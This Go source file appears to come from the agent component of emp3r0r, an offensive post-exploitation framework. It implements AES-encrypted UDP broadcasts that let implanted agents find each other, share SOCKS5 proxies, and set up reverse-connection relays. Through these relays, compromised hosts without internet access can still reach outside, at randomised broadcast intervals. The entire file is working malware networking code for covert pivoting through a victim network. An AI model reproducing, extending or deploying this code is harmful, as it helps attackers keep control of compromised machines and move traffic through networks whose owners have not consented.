package agent

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error) {
	var (
		passProxyCnt int      // one time only
		reverseConns []string // remember reverse proxies
	)
	defer cancel()
	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
	if err != nil {
		return
	}
	defer pc.Close()

	buf := make([]byte, 1024)

	// keep listening
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n == 0 {
			log.Printf("BroadcastServer has read nothing: %v", err)
			continue
		}

		// decrypt broadcast message
		decMsg := tun.AESDecrypt(AESKey, string(buf[:n]))
		if decMsg == "" {
			log.Printf("%x cannot be decrypted", buf[:n])
			continue
		}
		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)

		/*
			as an agent who already have internet or a working proxy
		*/
		hasInternet := tun.HasInternetAccess()
		isProxyOK := tun.IsProxyOK(AgentProxy)
		if hasInternet || isProxyOK {
			// ignore proxy msg
			if strings.HasPrefix(decMsg, "socks5://") {
				continue
			}

			// if addr is invalid, continue
			if !tun.ValidateIPPort(decMsg) {
				log.Printf("Invalid address %s, no reverse proxy will be provided", decMsg)
				continue
			}

			// this msg tells us to provide a reverse proxy
			go func() {
				for _, p := range reverseConns {
					if decMsg == p {
						log.Printf("We already have a reverse proxy for %s", decMsg)
						return
					}
				}
				// where to forward? local proxy or remote one?
				toAddr := "127.0.0.1" + ProxyPort
				if !hasInternet {
					toAddr = AgentProxy
				}
				err := tun.TCPConnJoin(ctx, cancel, decMsg, toAddr)
				if err != nil {
					log.Printf("TCPConnJoin: %v", err)
				}
				reverseConns = append(reverseConns, decMsg)
			}()
		}

		/*
			as an agent who needs a proxy
		*/
		if AgentProxy != "" && tun.IsProxyOK(AgentProxy) {
			log.Printf("BroadcastServer: %s already set and working fine\n", AgentProxy)
			continue
		}
		if tun.IsProxyOK(decMsg) {
			AgentProxy = decMsg
			log.Printf("BroadcastServer: %s set as AgentProxy\n", AgentProxy)

			// pass the proxy to others
			go passProxy(ctx, cancel, &passProxyCnt)
		} else {
			// if proxy is not reachable, we ask the proxy server to connect to us
			// and use a socks5://127.0.0.1:port proxy
			p, err := strconv.Atoi(ProxyPort)
			if err != nil {
				log.Printf("WTF? ProxyPort %s: %v", ProxyPort, err)
				continue
			}
			reverseProxyPort := p + 1
			reverseProxyAddr := fmt.Sprintf("0.0.0.0:%d", reverseProxyPort)

			// listen for reverse connection
			go func() {
				l, err := net.Listen("tcp", reverseProxyAddr)
				if err != nil {
					log.Printf("reverseProxyAddr listen: %v", err)
					return
				}
				defer l.Close()
				for ctx.Err() == nil {
					reverseConn, err := l.Accept()
					if err != nil {
						log.Printf("Listen: %v", err)
						continue
					}
					defer reverseConn.Close()
					log.Printf("Reverse proxy from %s", reverseConn.RemoteAddr().String())
					serveReverseConn(reverseConn, ctx)
				}
			}()

			// find an IP that can be connected to
			for _, ipnetstr := range tun.IPa() {
				selfaddr := strings.Split(ipnetstr, "/")[0]
				rproxymsg := fmt.Sprintf("%s:%d", selfaddr, reverseProxyPort)
				log.Printf("Sending %s on network %s", rproxymsg, addr)
				_, _ = pc.WriteTo([]byte(rproxymsg), addr) // send message
			}

			rproxy := fmt.Sprintf("socks5://127.0.0.1:%s", ProxyPort)
			for !tun.IsProxyOK(rproxy) {
				time.Sleep(time.Second)
			}
			AgentProxy = rproxy
			log.Printf("[+] Reverse proxy configured to %s", rproxy)
		}
	}
	return
}

func serveReverseConn(rconn net.Conn, ctx context.Context) {
	l, err := net.Listen("tcp", "0.0.0.0:"+ProxyPort)
	if err != nil {
		log.Printf("bind: %v", err)
		return
	}
	defer l.Close()
	defer rconn.Close()
	for ctx.Err() == nil {
		inconn, err := l.Accept()
		if err != nil {
			log.Printf("serveReverseConn: %v", err)
			continue
		}
		go func() {
			defer inconn.Close()
			_, err = io.Copy(inconn, rconn)
			if err != nil {
				log.Printf("inconn <- rconn: %v", err)
			}
		}()
		go func() {
			defer inconn.Close()
			_, err = io.Copy(rconn, inconn)
			if err != nil {
				log.Printf("inconn -> rconn: %v", err)
			}
		}()
	}
}

func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
	// one time only
	*count++
	if *count > 1 {
		log.Printf("passProxy count %d, aborting", *count)
		return
	}

	log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", AgentProxy)
	sl := strings.Split(AgentProxy, "//")
	if len(sl) < 2 {
		log.Printf("TCPFwd: invalid proxy addr: %s", AgentProxy)
		return
	}
	go func() {
		err := tun.TCPFwd(sl[1], ProxyPort, ctx, cancel)
		if err != nil {
			log.Print("TCPFwd: ", err)
		}
	}()
	go StartBroadcast(false, ctx, cancel)
}

// BroadcastMsg send a broadcast message on a network
func BroadcastMsg(msg, dst string) (err error) {
	pc, err := net.ListenPacket("udp4", ":8887")
	if err != nil {
		return
	}
	defer pc.Close()

	addr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%s", dst, BroadcastPort))
	if err != nil {
		return
	}

	// encrypt message
	encMsg := tun.AESEncrypt(AESKey, msg)
	if encMsg == "" {
		return fmt.Errorf("failed to encrypt %s", msg)
	}

	_, err = pc.WriteTo([]byte(encMsg), addr)
	log.Printf("BroadcastMsg: sent %s (%s) to %s", encMsg, msg, dst)
	return
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	if start_socks5 {
		// start a socks5 proxy
		err := Socks5Proxy("on", "0.0.0.0:"+ProxyPort)
		if err != nil {
			log.Printf("Socks5Proxy on: %v", err)
			return
		}
		defer func() {
			err := Socks5Proxy("off", "0.0.0.0:"+ProxyPort)
			if err != nil {
				log.Printf("Socks5Proxy off: %v", err)
			}
		}()
	}

	// also listen for broadcasts in case some agents want use to connect to them
	go func() {
		err := BroadcastServer(ctx, cancel)
		if err != nil {
			log.Printf("BroadcastServer: %v", err)
		}
	}()

	defer func() {
		log.Print("Broadcasting stopped")
		cancel()
	}()
	for ctx.Err() == nil {
		log.Print("Broadcasting our proxy...")
		time.Sleep(time.Duration(util.RandInt(10, 120)) * time.Second)
		ips := tun.IPaddr()
		for _, netip := range ips {
			proxyMsg := fmt.Sprintf("socks5://%s:%s", netip.IP.String(), ProxyPort)
			broadcastAddr := tun.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}
			err := BroadcastMsg(proxyMsg, broadcastAddr)
			if err != nil {
				log.Printf("BroadcastMsg failed: %v", err)
			}
		}
	}
}
